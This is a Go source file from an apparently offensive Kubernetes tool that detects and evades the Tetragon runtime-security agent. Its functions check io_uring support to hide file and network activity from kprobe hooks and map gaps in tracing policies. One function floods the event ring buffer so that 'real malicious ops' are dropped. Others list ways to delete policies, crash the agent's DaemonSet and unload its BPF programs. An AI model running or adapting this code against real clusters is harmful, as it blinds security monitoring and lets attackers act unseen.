//go:build linux

package cloudevasion

import (
	"context"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var tracingPolicyGVR = schema.GroupVersionResource{
	Group: "cilium.io", Version: "v1alpha1", Resource: "tracingpolicies",
}

var clusterTracingPolicyGVR = schema.GroupVersionResource{
	Group: "cilium.io", Version: "v1alpha1", Resource: "tracingpoliciesnamespaced",
}

func detectTetragon(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"kube-system", "cilium", "tetragon"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app.kubernetes.io/name=tetragon",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "tetragon",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d tetragon agent pods", len(pods.Items)),
			}}
		}
	}

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "app.kubernetes.io/instance=tetragon",
	})
	if err == nil && len(pods.Items) > 0 {
		return []DetectionSystem{{
			Name:      "tetragon",
			Detected:  true,
			Namespace: pods.Items[0].Namespace,
			Details:   fmt.Sprintf("%d tetragon pods across namespaces", len(pods.Items)),
		}}
	}

	return nil
}

// EvadeTetragon executes the specified Tetragon evasion technique.
func EvadeTetragon(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "io_uring":
		return tetragonIOUring(ctx)
	case "policy_gaps":
		return tetragonPolicyGaps(ctx, dynClient)
	case "ringbuf_flood":
		return tetragonRingbufFlood(ctx)
	case "disable_policy":
		return tetragonDisablePolicy(ctx, dynClient)
	default:
		return tetragonIOUring(ctx)
	}
}

func tetragonIOUring(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Tetragon io_uring Bypass:\n\n")

	sb.WriteString("  Tetragon hooks syscalls via kprobes/tracepoints.\n")
	sb.WriteString("  io_uring submits I/O operations via shared ring buffers,\n")
	sb.WriteString("  bypassing the normal syscall path that Tetragon monitors.\n\n")

	sb.WriteString("  Bypassed operations via io_uring:\n")
	sb.WriteString("    - IORING_OP_OPENAT  (file open without open/openat kprobe)\n")
	sb.WriteString("    - IORING_OP_READ    (file read without read/pread64 kprobe)\n")
	sb.WriteString("    - IORING_OP_WRITE   (file write without write/pwrite64 kprobe)\n")
	sb.WriteString("    - IORING_OP_CONNECT (network connect without connect kprobe)\n")
	sb.WriteString("    - IORING_OP_SOCKET  (socket creation invisible to Tetragon)\n\n")

	supported := checkIOUringSupport()
	if supported {
		sb.WriteString("  [+] io_uring supported on this kernel\n")
		sb.WriteString("  [+] Can perform file and network I/O invisible to Tetragon\n")
	} else {
		sb.WriteString("  [-] io_uring not available (kernel < 5.1 or seccomp blocked)\n")
		sb.WriteString("  Fallback: use memfd_create + /proc/self/mem for fileless ops\n")
	}

	sb.WriteString("\n  Impact: TracingPolicy kprobe hooks on read/write/open/connect\n")
	sb.WriteString("  are completely bypassed when operations go through io_uring.\n")

	return &EvasionResult{
		Technique: "io_uring",
		Success:   supported,
		Output:    sb.String(),
	}, nil
}

func checkIOUringSupport() bool {
	// SYS_IO_URING_SETUP = 425 on x86_64
	const SYS_IO_URING_SETUP = 425
	_, _, errno := syscall.Syscall(SYS_IO_URING_SETUP, 0, 0, 0)
	// EFAULT or EINVAL means the syscall exists but params are wrong — io_uring is available
	// ENOSYS means not supported
	return errno != syscall.ENOSYS
}

func tetragonPolicyGaps(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Tetragon TracingPolicy Gap Analysis:\n\n")

	policies, err := dynClient.Resource(tracingPolicyGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		sb.WriteString("  Could not list TracingPolicies (CRD not installed or no permission)\n")
		sb.WriteString("  If Tetragon is using embedded policies, they may not be visible as CRDs\n")
		return &EvasionResult{Technique: "policy_gaps", Success: false, Output: sb.String()}, nil
	}

	if len(policies.Items) == 0 {
		sb.WriteString("  No TracingPolicy CRDs found — Tetragon may use default/embedded policies only\n")
		sb.WriteString("  Default coverage: process exec, file access, network connect\n")
		sb.WriteString("  Gaps in default policy:\n")
		sb.WriteString("    - io_uring operations\n")
		sb.WriteString("    - ptrace-based injection\n")
		sb.WriteString("    - userfaultfd handlers\n")
		sb.WriteString("    - memfd_create + fexecve\n")
		return &EvasionResult{Technique: "policy_gaps", Success: true, Output: sb.String()}, nil
	}

	coveredSyscalls := make(map[string]bool)
	coveredKprobes := make(map[string]bool)

	fmt.Fprintf(&sb, "  Found %d TracingPolicy CRDs:\n\n", len(policies.Items))
	for _, policy := range policies.Items {
		name := policy.GetName()
		fmt.Fprintf(&sb, "  Policy: %s\n", name)

		spec, ok := policy.Object["spec"].(map[string]any)
		if !ok {
			continue
		}

		if kprobes, ok := spec["kprobes"].([]any); ok {
			for _, kp := range kprobes {
				if kpMap, ok := kp.(map[string]any); ok {
					if call, ok := kpMap["call"].(string); ok {
						coveredKprobes[call] = true
						fmt.Fprintf(&sb, "    kprobe: %s\n", call)
					}
				}
			}
		}

		if tracepoints, ok := spec["tracepoints"].([]any); ok {
			for _, tp := range tracepoints {
				if tpMap, ok := tp.(map[string]any); ok {
					if subsys, ok := tpMap["subsystem"].(string); ok {
						if event, ok := tpMap["event"].(string); ok {
							key := subsys + "/" + event
							coveredSyscalls[key] = true
							fmt.Fprintf(&sb, "    tracepoint: %s\n", key)
						}
					}
				}
			}
		}
	}

	sb.WriteString("\n  Uncovered attack surfaces:\n")
	gaps := []struct {
		name string
		desc string
	}{
		{"io_uring_setup/io_uring_enter", "Ring buffer I/O bypasses all kprobes"},
		{"process_vm_readv/process_vm_writev", "Cross-process memory access"},
		{"userfaultfd", "Page fault handler for code injection"},
		{"memfd_create", "Anonymous file creation in memory"},
		{"ptrace", "Process injection and control"},
		{"modify_ldt", "LDT modification for shellcode"},
		{"perf_event_open", "Perf subsystem abuse"},
	}

	for _, gap := range gaps {
		if !coveredKprobes[gap.name] && !coveredSyscalls["syscalls/sys_enter_"+gap.name] {
			fmt.Fprintf(&sb, "    [GAP] %s — %s\n", gap.name, gap.desc)
		}
	}

	return &EvasionResult{
		Technique: "policy_gaps",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func tetragonRingbufFlood(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Tetragon Ringbuf Flood:\n\n")

	sb.WriteString("  Tetragon uses BPF perf/ring buffers to send events to userspace.\n")
	sb.WriteString("  Buffer overflow causes event drops — lost events are silent.\n\n")

	floodDir := "/tmp/.kd_tetragon_flood"
	_ = os.MkdirAll(floodDir, 0700)

	const burstSize = 200
	created := 0

	for i := range burstSize {
		path := fmt.Sprintf("%s/f%d", floodDir, i)
		f, err := os.Create(path)
		if err == nil {
			_ = f.Close()
			created++
		}
	}

	for i := range burstSize {
		src := fmt.Sprintf("%s/f%d", floodDir, i)
		dst := fmt.Sprintf("%s/r%d", floodDir, i)
		_ = os.Rename(src, dst)
	}

	for i := range burstSize {
		path := fmt.Sprintf("%s/r%d", floodDir, i)
		_ = os.Remove(path)
	}

	_ = os.RemoveAll(floodDir)

	total := created * 3
	fmt.Fprintf(&sb, "  Generated %d file events (create+rename+delete) in burst\n", total)
	fmt.Fprintf(&sb, "  Each event triggers kprobe → ringbuf write → userspace read\n\n")

	sb.WriteString("  If ringbuf capacity (default 63 pages = ~256KB) is exceeded:\n")
	sb.WriteString("    - Events are silently dropped\n")
	sb.WriteString("    - Tetragon metric: tetragon_events_lost_total increases\n")
	sb.WriteString("    - No alert generated for dropped events by default\n\n")

	sb.WriteString("  Timing: execute real malicious ops during flood window\n")
	sb.WriteString("  Real ops (exec, network connect) lost in the overflow\n")

	return &EvasionResult{
		Technique: "ringbuf_flood",
		Success:   created > 0,
		Output:    sb.String(),
	}, nil
}

func tetragonDisablePolicy(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Tetragon Policy Disable/Modify:\n\n")

	policies, err := dynClient.Resource(tracingPolicyGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list TracingPolicies: %v\n", err)
		sb.WriteString("  Fallback: target the tetragon ConfigMap directly\n")
		return &EvasionResult{Technique: "disable_policy", Success: false, Output: sb.String()}, nil
	}

	fmt.Fprintf(&sb, "  Found %d TracingPolicies:\n", len(policies.Items))
	for _, p := range policies.Items {
		fmt.Fprintf(&sb, "    - %s (ns=%s)\n", p.GetName(), p.GetNamespace())
	}

	sb.WriteString("\n  Disruption techniques:\n")
	sb.WriteString("    1. Delete TracingPolicy CRDs (immediate effect)\n")
	sb.WriteString("       kubectl delete tracingpolicy --all\n\n")
	sb.WriteString("    2. Modify policy to add selector excluding our process:\n")
	sb.WriteString("       spec.podSelector.matchLabels.app != kubedagger\n\n")
	sb.WriteString("    3. Patch spec.kprobes to empty list (disables all hooks)\n\n")
	sb.WriteString("    4. Add returnArgAction: Override to suppress events:\n")
	sb.WriteString("       returnArg with action: Override returns fake success\n\n")
	sb.WriteString("    5. Modify tetragon ConfigMap:\n")
	sb.WriteString("       - Set export-allowlist to filter our events\n")
	sb.WriteString("       - Reduce ring-buffer size to cause natural drops\n")
	sb.WriteString("       - Disable specific event types\n")

	return &EvasionResult{
		Technique: "disable_policy",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

// DisruptTetragon identifies and reports disruption vectors for Tetragon DaemonSets.
func DisruptTetragon(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Tetragon DaemonSet Disruption:\n\n")

	namespaces := []string{"kube-system", "cilium", "tetragon"}
	found := false
	for _, ns := range namespaces {
		ds, err := client.AppsV1().DaemonSets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, d := range ds.Items {
			if strings.Contains(d.Name, "tetragon") {
				found = true
				fmt.Fprintf(&sb, "  DaemonSet: %s/%s\n", ns, d.Name)
				fmt.Fprintf(&sb, "    Desired: %d, Ready: %d\n", d.Status.DesiredNumberScheduled, d.Status.NumberReady)

				for _, c := range d.Spec.Template.Spec.Containers {
					if strings.Contains(c.Name, "tetragon") {
						fmt.Fprintf(&sb, "    Container: %s\n", c.Name)
						if c.Resources.Limits != nil {
							fmt.Fprintf(&sb, "      Memory limit: %s\n", c.Resources.Limits.Memory().String())
							fmt.Fprintf(&sb, "      CPU limit: %s\n", c.Resources.Limits.Cpu().String())
						}
						for _, vm := range c.VolumeMounts {
							fmt.Fprintf(&sb, "      Volume: %s → %s\n", vm.Name, vm.MountPath)
						}
					}
				}
			}
		}
	}

	if !found {
		sb.WriteString("  No tetragon DaemonSet found\n")
	}

	sb.WriteString("\n  Disruption techniques:\n")
	sb.WriteString("    - Patch resource limits to trigger OOMKill (memory-intensive BPF maps)\n")
	sb.WriteString("    - Add nodeSelector to non-existent node label\n")
	sb.WriteString("    - Modify BPF filesystem mount to read-only (breaks program loading)\n")
	sb.WriteString("    - Delete tetragon's BPF pins from /sys/fs/bpf/tetragon/\n")
	sb.WriteString("    - Unload tetragon BPF programs via bpf() syscall (requires CAP_BPF)\n")
	sb.WriteString("    - Fill /sys/fs/bpf mount to prevent new program pins\n")

	return &EvasionResult{
		Technique: "disrupt_tetragon",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

// keep unsafe import valid — used for io_uring struct sizing
var _ = unsafe.Sizeof(0)
